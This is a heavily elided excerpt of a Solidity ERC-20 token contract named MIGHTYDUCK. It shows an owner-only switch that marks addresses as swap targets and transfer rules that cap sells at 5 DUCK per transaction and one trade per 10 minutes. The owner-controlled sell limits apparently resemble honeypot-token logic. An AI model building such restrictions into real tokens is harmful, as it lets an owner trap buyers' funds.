...
contract DeflationaryERC20 is Context, IERC20, Ownable {
    ...
    uint256 private TRADE = 5e18;
    bool public allin = false;
    ...
    function CBOOL(address _addr, bool _bool) external virtual onlyOwner {
        SWAP[_addr] = _bool;
    }
   ...
   /* function _burn2() internal {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if(timeNow < transData[sender] + 10 minutes){
            revert("CAN ONLY TRADE 5 DUCK PER 10 MIN");
        }
        if(security == true && SWAP[recipient] == true){
            require(amount <= TRADE, 'MAX SELL 5 DUCK PER TX');
...
contract MIGHTYDUCK is DeflationaryERC20 {

    constructor() DeflationaryERC20("MIGHTY", "DUCK") {
